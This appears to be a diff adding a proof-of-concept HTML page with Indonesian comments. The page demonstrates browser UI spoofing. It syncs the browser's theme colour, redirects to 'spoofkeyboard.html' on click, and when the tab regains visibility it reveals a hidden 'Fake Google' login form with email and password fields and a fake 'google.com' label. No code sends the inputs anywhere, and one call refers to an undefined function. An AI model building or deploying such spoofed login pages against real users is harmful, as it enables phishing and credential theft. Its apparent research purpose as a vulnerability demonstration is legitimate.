@@ -1,0 +1,141 @@
+
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+
+  <meta name="theme-color" content="#ffffff" id="theme-color-meta" />
+
+  <title>POC</title>
+
+  <style>
+    /* warna tema dikontrol lewat CSS variable sehingga mudah diubah */
+    :root{
+      --theme-color: #ffffff; /* default latar terang */
+      --text-color: #111;
+    }
+
+    /* kalau user mode gelap, sesuaikan CSS variable */
+    @media (prefers-color-scheme: dark){
+      :root{
+        --theme-color: #0b1220; /* contoh latar gelap */
+        --text-color: #eaeaea;
+      }
+    }
+
+    /* contoh layout */
+    html,body{
+      height:100%;
+      margin:0;
+      background:var(--theme-color);
+      color:var(--text-color);
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+    }
+
+    header{
+      padding:20px;
+      font-weight:700;
+      font-size:1.2rem;
+      /* bisa pakai gradien tapi catatan: chrome akan gunakan single color dari meta */
+    }
+
+    main{
+      padding:20px;
+    }
+
+    /* contoh tombol berganti warna latar */
+    /*.controls{ position:fixed; right:12px; bottom:12px; display:flex; gap:8px; }
+    .btn{ padding:8px 12px; border-radius:8px; border:1px solid rgba(0,0,0,0.08); background:rgba(255,255,255,0.65); cursor:pointer; }
+    */
+  </style>
+</head>
+<body>
+  <header id="h"></header>
+  <main id="m">
+    <p id="p"></p>
+     <div class="controls">
+     
+     <button class="btn" id="dark">Click</button>
+     
+     <div id="login" style="opacity:0">
+     <p>Fake Google</p>
+     <div><label>Email:</label> <input  id="email" type="text"> </div>
+     <div><label>Password:</label> <input type="text"> </div>
+     </div>
+    </div>
+
+  </main>
+   <div id="fake" style="background-color:white;font-size:small;opacity:0;margin-top:48%">
+    
+     <label style="margin-left: 40%;">google.com</label>
+   </div>
+    
+
+
+  <script>
+    
+    const meta = document.querySelector('meta[name="theme-color"]');
+
+    function getCssThemeColor(){
+      return getComputedStyle(document.documentElement).getPropertyValue('--theme-color').trim() || '#ffffff';
+    }
+
+   
+    function syncMetaThemeColor(){
+      const color = getCssThemeColor();
+      meta.setAttribute('content', color);
+     
+    }
+
+ 
+    syncMetaThemeColor();
+
+   
+    document.getElementById('dark').addEventListener('click', ()=>{
+     
+      document.documentElement.style.setProperty('--theme-color', '#808080');
+      document.documentElement.style.setProperty('--text-color', '#111');
+       syncMetaThemeColor();
+      window.location.href='spoofkeyboard.html'
+    });
+
+ 
+
+    const mq = window.matchMedia('(prefers-color-scheme: dark)');
+    mq.addEventListener && mq.addEventListener('change', (e)=>{
+     
+      setTimeout(syncMetaThemeColor, 50);
+    });
+
+  
+     
+     
+document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible')
+      { 
+         if (document.readyState === 'complete') {
+  
+	 document.documentElement.style.setProperty('--text-color', '#111');
+         document.getElementById("dark").style.opacity="0"
+         document.getElementById("login").style.opacity="1"
+         document.getElementById("fake").style.opacity="1"
+         syncThemeColor();
+         }
+         //window.alert(1)
+       }
+       else
+       {
+           
+          document.getElementById("dark").style.opacity="1"
+         document.getElementById("login").style.opacity="0"
+         document.getElementById("fake").style.opacity="0"
+       }
+    
+    });
+
+   </script>
+</body>
+</html>
